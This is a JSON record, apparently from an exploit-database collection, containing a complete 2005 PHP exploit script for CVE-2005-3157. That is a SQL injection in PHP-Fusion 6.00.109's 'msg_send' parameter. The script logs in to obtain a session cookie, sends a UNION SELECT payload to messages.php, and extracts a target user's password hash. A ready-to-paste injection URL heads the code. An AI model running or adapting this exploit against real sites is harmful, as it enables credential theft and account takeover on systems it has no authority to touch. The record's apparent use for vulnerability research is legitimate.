{
  "id": "1237",
  "title": "PHP-Fusion 6.00.109 - &#039;msg_send&#039; SQL Injection",
  "cve": "CVE-2005-3157",
  "vuln_type": "sqli",
  "code": "<php\r\n# if magic_quotes off -> SQL Injection, poc:\r\n#\r\n# http://[target]/[path_to_Php_Fusion]/messages.php?msg_send=' UNION SELECT user_password FROM fusion_users WHERE user_name='[admin_username]'/*\r\n## inserted the above for a better description /str0ke\r\n#\r\n#   19.17 28/09/2005                                                           #\r\n#                                                                              #\r\n#   -- PhpF6_00_109xpl.php                                                     #\r\n#                                                                              #\r\n#   PHP-Fusion v6.00.109 SQL Injection / admin|users credentials disclosure    #\r\n#                                                                              #\r\n#                                by rgod                                       #\r\n#                      site: http://rgod.altervista.org                        #\r\n#                                                                              #\r\n#   mphhh, private messages again...tze,tze                                    #\r\n#                                                                              #\r\n#   make these changes in php.ini if you have troubles                         #\r\n#   to launch this script:                                                     #\r\n#   allow_call_time_pass_reference = on                                        #\r\n#   register_globals = on                                                      #\r\n#                                                                              #\r\n#   usage: launch this script from Apache, fill requested fields, then         #\r\n#   go!                                                                        #\r\n#                                                                              #\r\n#   Sun-Tzu: \"Therefore the clever combatant imposes his will on the enemy,    #\r\n#   but does not allow the enemy's will to be imposed on him\"                  #\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\", 2);\r\nob_implicit_flush (1);\r\n\r\necho'<head><title> *** PHP-Fusion  v6.00.109  SQL  Injection ***  </title> <meta\r\nhttp-equiv= \"Content-Type\"   content=\"text/html;   charset=iso-8859-1\">   <style\r\ntype=\"text/css\"><!-- body,td,th {color:#00FF00;} body{background-color: #000000;}\r\n.Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif; font-size: 10px; }\r\n.Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif; font-weight:  bold;\r\nfont-style: italic; } --> </style></head><body> <p class=\"Stile6\"> Php-Fusion v6.\r\n00.109  SQL Injection / admin|user credentials disclosure </p><p class=\"Stile6\">\r\na script  by rgod at <a href=\"http://rgod.altervista.org\"       target=\"_blank\">\r\nhttp://rgod.altervista.org</a></p><table width=\"84%\"><tr><td width=\"43%\">  <form\r\nname=\"form1\"  method=\"post\"  action=\"'.$SERVER[PHP_SELF].'?path=value&host=value\r\n&port=value&proxy=value&user=value&pass=value&username=value\">   <p>      <input\r\ntype=\"text\" name=\"host\"><span class=\"Stile5\"> hostname ( ex:  www.sitename.com )\r\n</span></p> <p> <input type=\"text\" name=\"path\"><span class=\"Stile5\">  path  (ex:\r\n/phpfusion/ or just /)</span></p><p> <input  type=\"text\"  name=\"port\">     <span\r\nclass=\"Stile5\">specify a port other than 80 (default value)</span></p><p> <input\r\ntype=\"text\" name=\"user\"> <span  class=\"Stile5\">your username </span> </p>    <p>\r\n<input type=\"text\" name=\"pass\"> <span  class=\"Stile5\">your password ( to  get  a\r\nvalid session cookie) </span></p><p><input type=\"text\" name=\"username\">    <span\r\nclass=\"Stile5\">user  whom you want the password </span></p><p><input type=\"text\"\r\nname=\"proxy\"> <span class=\"Stile5\"> send  exploit  trough  an HTTP proxy </span>\r\n</p> <p> <input type=\"submit\"name=\"Submit\"  value=\"go!\"> </p></form> </td> </tr>\r\n</table></body></html>';\r\n\r\nfunction show($headeri)\r\n{\r\n$ii=0;\r\n$ji=0;\r\n$ki=0;\r\n$ci=0;\r\necho '<table border=\"0\"><tr>';\r\nwhile ($ii <= strlen($headeri)-1)\r\n{\r\n$datai=dechex(ord($headeri[$ii]));\r\nif ($ji==16) {\r\n             $ji=0;\r\n             $ci++;\r\n             echo \"<td>&nbsp;&nbsp;</td>\";\r\n             for ($li=0; $li<=15; $li++)\r\n                      { echo \"<td>\".$headeri[$li+$ki].\"</td>\";\r\n\t\t\t    }\r\n            $ki=$ki+16;\r\n            echo \"</tr><tr>\";\r\n            }\r\nif (strlen($datai)==1) {echo \"<td>0\".$datai.\"</td>\";} else\r\n{echo \"<td>\".$datai.\"</td> \";}\r\n$ii++;\r\n$ji++;\r\n}\r\nfor ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)\r\n                      { echo \"<td>&nbsp&nbsp</td>\";\r\n                       }\r\n\r\nfor ($li=$ci*16; $li<=strlen($headeri); $li++)\r\n                      { echo \"<td>\".$headeri[$li].\"</td>\";\r\n\t\t\t    }\r\necho \"</tr></table>\";\r\n}\r\n\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\nfunction sendpacket()\r\n{\r\nglobal $proxy, $host, $port, $html, $packet;\r\nif ($proxy=='')\r\n           {$ock=fsockopen(gethostbyname($host),$port);}\r\n             else\r\n           {\r\n\t    if (!eregi($proxy_regex,$proxy))\r\n\t    {echo htmlentities($proxy).' -> not a valid proxy...';\r\n\t     die;\r\n\t    }\r\n\t   $parts=explode(':',$proxy);\r\n           echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n           $ock=fsockopen($parts[0],$parts[1]);\r\n\t    if (!$ock) { echo 'No response from proxy...';\r\n\t\t\tdie;\r\n \t\t       }\r\n\t   }\r\nfputs($ock,$packet);\r\nif ($proxy=='')\r\n  {\r\n    $html='';\r\n    while (!feof($ock))\r\n      {\r\n        $html.=fgets($ock);\r\n      }\r\n  }\r\nelse\r\n  {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))\r\n    {\r\n      $html.=fread($ock,2048);\r\n    }\r\n  }\r\nfclose($ock);\r\necho nl2br(htmlentities($html));\r\n}\r\n\r\n\r\nif (($path<>'') and ($host<>'') and ($user<>'') and ($pass<>'') and ($username<>''))\r\n{\r\n  if ($port=='') {$port=80;}\r\n\r\n#STEP 1 -> login, to retrieve a session cookie...\r\n\r\n$data=\"user_name=\".urlencode(trim($user)).\"&user_pass=\".urlencode(trim($pass)).\"&login=Login\";\r\nif ($proxy=='')\r\n{$packet=\"POST \".$path.\"news.php HTTP/1.1\\r\\n\";}\r\nelse\r\n{$packet=\"POST http://\".$host.$path.\"news.php HTTP/1.1\\r\\n\";}\r\n\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"/news.php\\r\\n\";\r\n$packet.=\"Accept-Language: en\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: Googlebot/2.1\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: Keep-Alive\\r\\n\";\r\n$packet.=\"Cache-Control: no-cache\\r\\n\";\r\n$packet.=\"Cookie: fusion_visited=yes; PHPSESSID=44ab49664b56b97036425427b1ffb8cf\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nshow($packet);\r\nsendpacket($packet);\r\n$temp=explode(\"Set-Cookie: \",$html);\r\n$temp2=explode(' ',$temp[1]);\r\n$cookie=$temp2[0];\r\necho '<br>Your cookie: '.htmlentities($cookie);\r\n\r\n# STEP 2 -> SQL Injection, now retrieve the MD5 password hash from database\r\n$username=str_replace(\"'\",\"\",$username);\r\n$sql=\"' UNION SELECT user_password FROM fusion_users WHERE user_name='\".trim($username).\"'/*\";\r\n\r\nif ($proxy=='')\r\n{$packet=\"GET \".$path.\"messages.php?msg_send=\".urlencode($sql).\" HTTP/1.1\\r\\n\";}\r\nelse\r\n{$packet=\"GET http://\".$host.$path.\"messages.php?msg_send=\".urlencode($sql).\" HTTP/1.1\\r\\n\";}\r\n\r\n$packet.=\"User-Agent: GameBoy, Powered by Nintendo\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\r\\n\";\r\n$packet.=\"Accept-Language: en\\r\\n\";\r\n$packet.=\"Accept-Charset: windows-1252, utf-8, utf-16, iso-8859-1;q=0.6, *;q=0.1\\r\\n\";\r\n$packet.=\"Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\r\\n\";\r\n$packet.=\"Cookie: \".$cookie.\"\\r\\n\";\r\n$packet.=\"Cookie2: \\$Version=1\\r\\n\";\r\n$packet.=\"Connection: Keep-Alive, TE\\r\\n\";\r\n$packet.=\"TE: deflate, gzip, chunked, identity, trailers\\r\\n\\r\\n\";\r\nshow($packet);\r\nsendpacket($packet);\r\nif (eregi('For Members only',$html)) {echo 'You have to specify a valid session cookie...'; die; }\r\n$temp=explode(\"'Click to view the senders profile'>\",$html);\r\n$temp2=explode(\"</a>\",$temp[1]);\r\n$hash=$temp2[0];\r\necho '<br>Username: '.htmlentities($username).' Password hash: '.$hash;\r\n\r\n}\r\nelse\r\n{ echo '<br> Fill requested fields, optionally specify a proxy...';}\r\n\r\n?>\r\n\r\n# milw0rm.com [2005-09-28]",
  "url": "https://www.exploit-db.com/exploits/1237"
}